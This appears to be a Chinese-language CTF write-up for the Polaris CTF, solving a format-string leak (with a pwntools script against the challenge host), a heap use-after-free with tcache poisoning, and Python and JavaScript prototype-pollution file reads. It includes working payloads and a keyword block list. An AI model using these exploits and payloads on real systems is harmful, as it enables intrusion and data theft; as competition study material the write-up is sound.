---
title: "polaris"
lastmod: 2026-03-29T14:52:37+08:00
draft: false
---
# pwn
## ez-nc


连上服务后只有一个提示：


```text

Enter the filename to download:

```


看起来像是一个“输入文件名然后下载内容”的程序，所以一开始自然会先试常见路径：


- `/etc/passwd`

- `/proc/self/maps`

- `/proc/self/exe`


但是这里有两个异常现象：

1. 长路径的返回结果会被拆开

2. `proc` 和 `ez-nc` 相关内容会被特殊拦截

比如输入 `/etc/passwd` 时，服务端并不是把整个字符串当成一个文件名处理，而是会出现类似：
  
```text

/etc/pa not existed or could not be opened.

...

sswd not existed or could not be opened.

```


这说明程序读取文件名时，缓冲区非常小，只能读下前面几字节。结合测试结果，基本可以判断是 **最多只读 7 个可见字符**。

也就是说，题目表面上像“任意文件读”，实际上长路径根本传不进去。

### 1.发现格式化字符串漏洞


继续测试时，输入下面这些内容会出现明显异常：


```text

%p

%x

%1$p

%2$p

```


返回结果例如：
  

```text

0x7ffc56e1b2f1 not existed or could not be opened.

0x204 not existed or could not be opened.

afaaec31 not existed or could not be opened.

```


这里已经非常明确了：

- `%p` 被解释成了指针输出

- `%x` 被解释成了十六进制输出


这说明程序在打开文件失败时，不是安全地输出：

```c

printf("%s not existed or could not be opened.\n", filename);

```


而是写成了类似：

```c

printf(filename);

puts(" not existed or could not be opened.");

```


因此存在一个标准的 **format string vulnerability（格式化字符串漏洞）**。


### 2. 利用思路


因为题目对文件名长度限制很严格，想靠路径读文件不现实，所以更好的路线是：


1. 利用 `%n$p` 枚举栈上的参数

2. 找到一个能稳定指向大块可读内存的位置

3. 再用 `%n$s` 把该地址当作字符串打印出来


实际枚举后，`%45$s` 的效果非常好，会直接泄露一大片内存。


这片内存里不仅有 ELF 内容、字符串表、函数名，还直接带出了 flag。


### 3. 为什么 `%45$s` 能拿到 flag


`%45$s` 的含义是：


- 取 `printf` 的第 45 个参数

- 把它当成一个 `char *`

- 按字符串一直打印到 `\\x00`


这个位置恰好指向了进程内存中的一大块可读区域，其中包含：


- 程序 ELF 数据

- 程序中的只读字符串

- 以及被放进内存中的 flag


所以我们不需要精确控制写地址，也不需要 ROP，只靠一次内存泄露就足够了。


### 4. exp
  

最终 exp 很短，核心就是打一发 `%45$s`，然后正则提取 flag：
  

```python

from pwn import *

import re

  

HOST = "nc1.ctfplus.cn"

PORT = 27094

PROMPT = b"Enter the filename to download: "

FLAG_RE = re.compile(rb"polarisctf\{[^}]+\}")

  
  

def main() -> None:

    io = remote(HOST, PORT)

    io.recvuntil(PROMPT)

    io.sendline(b"%45$s")

    data = io.recvrepeat(2)

    io.close()

  

    match = FLAG_RE.search(data)

    if not match:

        raise SystemExit("flag not found")

  

    print(match.group().decode())

  
  

if __name__ == "__main__":

    main()

```

## ez-heap

**题目概述**  
题目程序是一个伪装成 “Edge Runtime Control Plane” 的 C++ 菜单堆题。环境带了 libc.so.6、ld-linux-x86-64.so.2，并且有 seccomp，禁用了 execve/execveat，所以这题不适合走传统 system("/bin/sh")，更适合直接调用程序内部的读 flag 逻辑。

远端实测得到的 flag 是：

`polarisctf{5181dee8-dda3-4935-9dd0-47bd576b737e}`

**保护情况**  
程序开启了这些保护：

- PIE
- NX
- Canary
- Full RELRO

因此常规 GOT 覆写、栈溢出都不是主路线，核心利用点在堆对象生命周期管理错误。

**关键功能分析**  
和利用相关的菜单主要有 4 个：

- 5. Allocate session tensor
- 6. Complete batch inference
- 7. Patch session metadata
- 9. Dispatch async task
- 10. Runtime telemetry

先说最关键的两个结构。

Allocate session tensor 会申请一个大小为 0x50 的 session 结构，典型内容大致如下：

`struct session { uint32_t slot; uint32_t size; void *payload; char pad[0x20]; void (*postproc)(struct session *); // 末尾附近 };`

Complete batch inference 会做两件事：

1. 对 payload 做简单变换/后处理
2. free(payload)，再 free(session)

但是它 **不会把全局数组里的 session* 清空**，所以菜单 7 里还能继续用这个已经被 free 的指针，这就是 UAF。

菜单 Patch session metadata 又有限制：

- 只能 patch “recycled session”
- qword_index 只能是 0

这意味着我们虽然不能随便改整个对象，但可以改掉 **freed session chunk 用户区的第一个 qword**。而对 tcache 来说，这个位置刚好就是：

`tcache_entry->next`

所以这题的核心就是：

`UAF + 单 qword 写 + tcache poisoning`

**信息泄露点**  
菜单 10. Runtime telemetry 会直接输出很多关键地址，例如：

- scheduler.ctrl
- diag.audit_sink
- [session:i] handle=...
- [scheduler.head] desc=...

这意味着：

- 可以直接泄露 PIE 基址
- 可以拿到已分配 session 的堆地址
- 可以拿到当前任务描述符 desc 的地址

因此本题基本不缺地址信息。

**为什么不能只 free 两个 chunk**  
这题有一个很容易踩的坑：远端的 glibc 是带新版 tcache 计数逻辑的。

如果只 free 1 个或 2 个 0x50 chunk，然后把其中一个 chunk 的 next 改成目标地址，很多时候你会发现：

- entries[idx] 看起来被你改了
- 但真正 malloc 时并不会立刻返回目标地址

原因是 tcache 不只看链表头，还看 bin 的 count。  
想稳定拿到伪造目标地址，需要至少准备 **3 个同尺寸 chunk**：

1. free 三个 chunk
2. 修改中间那个 freed chunk 的 next
3. 连续 malloc 三次
4. 第三次才会稳定落到目标地址

这也是我最后 exp 里为什么要一次申请 6 个 session，分两轮各 free 3 个。

**利用思路**  
总体分两阶段。

第一阶段目标：

`把 scheduler.ctrl 里的 strict_policy 改成 0`

原因是默认策略会拦截非白名单 handler；我们后面要把任务处理函数改成内部读 flag 函数，必须先把这个限制关掉。

第二阶段目标：

`覆盖 task0 的 desc，把 handler 改成 audit_sink`

audit_sink 是程序内部现成的读 flag 并输出的函数。  
菜单 Dispatch async task(0) 最终会调用：

`desc->handler(desc->ctx);`

所以只要把 handler 改成 audit_sink，再触发任务 0，就能直接打印 flag。

**第一阶段：改 strict_policy**  
做法如下：

1. 申请 6 个 session
2. 利用 telemetry 泄露：
    - scheduler.ctrl
    - session[1] 地址
3. free session[0], session[1], session[2]
4. 用菜单 7 修改 session[1] 的第一个 qword：
    - 写成 PROTECT_PTR(session[1], scheduler.ctrl)
5. 连续调用 3 次 Provision worker profile

前两次只是从正常 tcache chunk 取内存。  
第三次会把一个 worker profile 直接分配到 scheduler.ctrl 上。

worker profile 的布局里第二个字段正好落到 scheduler.ctrl + 0x8，也就是 strict_policy 所在位置。  
把它写成 0 即可成功绕过策略检查。

**第二阶段：改任务描述符**  
再重复一次三 chunk 的 tcache poisoning，这次目标不是 scheduler.ctrl，而是：

`scheduler.head 对应的 task desc`

同样利用 telemetry 可以拿到：

- desc0
- session[4]

然后：

1. free session[3], session[4], session[5]
2. patch session[4]->next = desc0
3. 再连续申请 3 次 worker profile

第三次分配会直接落到活着的 desc0 上。

这里两个结构大小相同，都是 0x50，所以可以直接用 worker profile 去覆盖 task_desc。

关键覆盖关系如下：

`task_desc + 0x18 -> handler task_desc + 0x20 -> ctx task_desc + 0x28 -> tag`

而 worker profile 的第 4 个 qword 正好会写到 +0x18，因此把它填成 audit_sink 即可。

我最后用的覆盖值是：

- handler = audit_sink
- ctx = 0xdeadbeef
- tag = "PWNED"

覆盖完成后，telemetry 里能看到：

`[scheduler.head] desc=... handler=...audit_sink... ctx=0xdeadbeef tag='PWNED'`

说明劫持成功。

**最终触发**  
最后执行：

`9. Dispatch async task task_id = 0`

程序就会跑到我们覆盖后的：

`audit_sink(0xdeadbeef);`

它内部会读取 ./flag 并打印：

`[audit] snapshot: polarisctf{5181dee8-dda3-4935-9dd0-47bd576b737e}`

**利用流程总结**  
可以概括成下面这几步：

1. 申请 6 个 session
2. 用 telemetry 泄露 PIE、scheduler.ctrl、desc0、若干 session 地址
3. 第一轮 3-chunk tcache poisoning
4. 分配到 scheduler.ctrl，清掉 strict_policy
5. 第二轮 3-chunk tcache poisoning
6. 分配到 desc0，覆盖 handler = audit_sink
7. dispatch task 0
# web
## ez_python

```python
from flask import Flask, request  
import json  
  
app = Flask(__name__)  
  
def merge(src, dst):  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)  
  
class Config:  
    def __init__(self):  
        self.filename = "app.py"  
  
class Polaris:  
    def __init__(self):  
        self.config = Config()  
  
instance = Polaris()  
  
@app.route('/', methods=['GET', 'POST'])  
def index():  
    if request.data:  
        merge(json.loads(request.data), instance)  
    return "Welcome to Polaris CTF"  
  
@app.route('/read')  
def read():  
    return open(instance.config.filename).read()  
  
@app.route('/src')  
def src():  
    return open(__file__).read()  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000, debug=False)
```

核心漏洞在这里：

if request.data:  
    merge(json.loads(request.data), instance)

用户可控 JSON 会被递归合并到 `instance` 对象中。

再看 `merge()`：

def merge(src, dst):  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)

它的行为可以概括为：

- 如果目标是字典，就往字典里写
- 如果目标对象存在对应属性，并且传入值还是字典，就继续递归
- 否则直接 `setattr(dst, k, v)`

也就是说，攻击者可以通过构造 JSON，递归修改对象内部属性。

---

### 利用思路

程序初始化时：

instance = Polaris()  
instance.config = Config()  
instance.config.filename = "app.py"

而 `/read` 路由为：

@app.route('/read')  
def read():  
    return open(instance.config.filename).read()

因此只要我们把：

instance.config.filename

改成 `/flag`，再访问 `/read`，就能读到 flag。

---

### 构造 Payload

因为 `instance` 中有 `config` 属性，而 `config` 中有 `filename` 属性，所以直接提交：

{"config":{"filename":"/flag"&#125;&#125;

merge 之后就会变成：

instance.config.filename = "/flag"

然后访问 `/read` 即可。

## ezpollute

**题目分析**

这题的核心接口有两个：

- POST /api/config：更新配置
- GET /api/status：启动一个新的 node 子进程并返回输出

先看配置合并函数：

`function merge(target, source, res) { for (let key in source) { if (key === '__proto__') { if (res) { res.send('get out!'); return; } continue; } if (source[key] instanceof Object && key in target) { merge(target[key], source[key], res); } else { target[key] = source[key]; } } }`

这里虽然过滤了 __proto__，但是没有过滤 constructor.prototype，因此仍然可以造成原型污染。

例如传入：

`{ "constructor": { "prototype": { "OPENSSL_CONF": "/flag" } } }`

合并过程会变成：

- config.constructor === Object
- Object.prototype 可达
- 最终把 OPENSSL_CONF 写到 Object.prototype

于是全局对象原型被污染。

---

**漏洞点**

/api/config 虽然做了关键字过滤：

`const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];`

但这里只是检查 JSON 字符串里是否出现这些键名，并没有拦截：

- constructor
- prototype
- OPENSSL_CONF

所以污染完全可以成功。

---

**利用链**

再看 /api/status：

`const customEnv = Object.create(null); for (let key in process.env) { if (key === 'NODE_OPTIONS') { const value = process.env[key] || ""; const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i; if (!dangerousPattern.test(value)) { customEnv[key] = value; } continue; } customEnv[key] = process.env[key]; }`

这里有一个很关键的问题：

- for...in 会遍历对象的可枚举继承属性
- 如果我们污染了 Object.prototype.OPENSSL_CONF
- 那么这里会把继承来的 OPENSSL_CONF 也复制到 customEnv

然后它启动子进程：

`const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], { env: customEnv, shell: false });`

Node 启动时会读取环境变量 OPENSSL_CONF，并尝试把它当成 OpenSSL 配置文件加载。

如果我们让：

`OPENSSL_CONF=/flag`

那么 Node 启动时就会去读 /flag。  
而 /flag 显然不是合法的 OpenSSL 配置文件，因此会在 stderr 中输出解析报错。题目又把 stderr 原样拼回响应：

`proc.stderr.on('data', (data) => { output += data; });`

这样就形成了任意文件内容泄露。

---

**为什么能泄露 flag**

OpenSSL 解析错误通常会带出出错行内容，类似：

`OpenSSL configuration error: ... missing equal sign ... HERE-->{xxxxx}line 1`

如果 flag 是一行，例如：

`flag{xxxxxxxxxxxxxxxx}`

报错信息里很可能会把这一行的一部分显示出来。  
有时会显示成：

`HERE-->{xxxxxxxxxxxx}line 1`

这是因为前面的 flag 被 OpenSSL 当作配置项名字吃掉了，但剩下的 {...} 仍然会回显，手动补上 XMCTF 即可。

